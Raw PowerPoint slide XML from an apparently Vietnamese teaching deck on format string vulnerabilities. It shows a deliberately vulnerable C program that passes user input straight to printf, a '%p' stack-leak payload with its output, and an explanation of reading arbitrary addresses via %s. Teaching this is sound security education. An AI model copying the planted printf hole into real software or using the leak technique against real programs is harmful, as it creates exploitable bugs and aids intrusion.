          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Khi request nhiều argument hơn thật sự truyền vào, argument sẽ được lấy từ các register và từ stack thông qua va_arg (%specifiers).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Áp dụng tính chất này kết hợp với tính năng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>read và write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> đã có ở trên ta hoàn toàn có thể kiểm soát được argument mà không cần truyền thẳng vào printf.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3034080" y="3429000"/>
            <a:ext cx="6108840" cy="820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4800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFB66C"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>printf(user_controlled)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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6" name="TextBox 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="4545000" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>READ — leak stack bằng %p</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167" name="TextBox 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10968480" cy="4586760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>// fmt_read.c </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>char leakme[] = "SECRET_LEAKME_1337";   /* global in .data */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("leakme @ %p\n", (void*)leakme);  </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("Enter format: ");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>fgets(fmt, sizeof(fmt), stdin);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf(fmt);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>   // format string vulnerability ở đây</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>$ gcc -w fmt_read.c -o fmt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>$ echo '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./fmt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>leakme @ 0x403030</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Enter format: 0x405021.0x7fffffffdc80.0x7ffff7f9d760.0x405044.(nil).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x70252e.(nil).(nil)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Mỗi lần gặp %p, va_arg sẽ được printf call để lấy argument. Nên tương tự việc ta call va_arg, thì ta chỉ việc send thật nhiều %p.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1300" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="201"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>0x70252e70252e7025 = chính payload "%p.%p." của ta (0x70='p', 0x25='%', 0x2e='.') vì input của ta được lưu vào fmt[] nằm trên stack </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8" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="5429880" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>READ — leak value địa chỉ bất kỳ </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="TextBox 137"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10968480" cy="5292000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>// fmt_read.c</a:t>
            </a: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#include &lt;stdio.h&gt;</a:t>
            </a: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#include &lt;string.h&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pP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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>char leakme[] = "SECRET_LEAKME_1337";   /* global in .data */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pP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int main(void) {</a:t>
            </a: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    char fmt[100];</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pP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    printf("leakme @ %p\n", (void*)leakme);</a:t>
            </a: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    printf("Enter format: ");</a:t>
            </a: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    if (fgets(fmt, sizeof(fmt), stdin) == NULL)</a:t>
            </a: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        return 1;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pP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    size_t len = strlen(fmt);</a:t>
            </a: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    if (len &gt; 0 &amp;&amp; fmt[len - 1] == '\n')</a:t>
            </a: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        fmt[len - 1] = '\0';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="14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highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    printf(fmt);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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    return 0;</a:t>
            </a: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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="99"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>chương trình in 'leakme @ 0x403030' — leakme là global ở .data, binary no-PIE nên địa chỉ cố định</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0" name="TextBox 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="5429880" cy="5468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Calibri"/>
              </a:rPr>
              <a:t>READ — leak value địa chỉ bất kỳ </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="TextBox 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="458640" y="1318680"/>
            <a:ext cx="10969200" cy="4473360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Để có thể đọc được </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="127622"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>địa chỉ bất kỳ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> thì ta dùng tính năng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="00A933"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>read qua %s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> ở trên đã đề cập.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>%s có thể đọc giá trị của argument và argument </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FF6D6D"/>
                </a:highlight>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>có thể lấy trên stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
